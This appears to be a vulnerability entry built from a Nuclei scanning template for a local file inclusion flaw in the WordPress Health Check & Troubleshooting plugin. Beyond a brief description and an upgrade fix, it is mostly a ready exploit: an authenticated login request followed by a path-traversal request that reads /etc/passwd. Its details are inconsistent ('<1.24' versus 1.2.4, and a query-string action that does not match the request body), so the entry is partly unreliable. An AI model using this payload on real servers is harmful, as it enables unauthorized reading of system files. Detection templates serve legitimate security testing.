# Vulnerability: WordPress Health Check & Troubleshooting <1.24 - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`health-check-lfi.yaml`)

## Description
WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.

## Secure Mitigation
Upgrade to version 1.2.4 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=health-check-view-file-diff&file=../../../../../../etc/passwd
```

